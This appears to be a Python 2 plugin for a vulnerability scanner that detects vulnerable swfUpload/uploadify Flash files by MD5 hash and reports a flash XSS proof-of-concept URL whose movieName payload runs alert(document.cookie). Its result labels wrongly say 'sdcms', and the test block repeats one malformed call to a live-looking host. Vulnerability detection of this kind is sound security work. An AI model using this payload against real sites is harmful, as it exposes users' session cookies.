#!/usr/bin/env
#*_* coding: utf-8 *_*

#name: swfUpload.swf|uploadify.swf flash xss 合集
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2014-069833/
from ..miniCurl import Curl
from ..t  import T

import md5


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        md5_list = [
            '3a1c6cc728dddc258091a601f28a9c12',
            '53fef78841c3fae1ee992ae324a51620',
            '4c2fc69dc91c885837ce55d03493a5f5',        
        ]
        code, head, res, err, _ = curl.curl2(arg)
        if code == 200:
            md5_value = md5.new(res).hexdigest()
            if md5_value in md5_list:
                output(arg + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// flash xss',result,'warning')
            else:
                #debug(arg + ' **_**' + md5_value)
                pass
        else:
            #debug(arg + '**__**not found')
            pass
    

        del curl
        return result


def output(url,result,label):
    info = url + '  sdcms  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='sdcms Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/sdcms/sdcms_3114b79e6d650cbdbaf0e8f592f884ad.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    

#/root/github/poccreate/thirdparty/sdcms/sdcms_3114b79e6d650cbdbaf0e8f592f884ad.py
#/root/github/poccreate/codesrc/exp-1817.py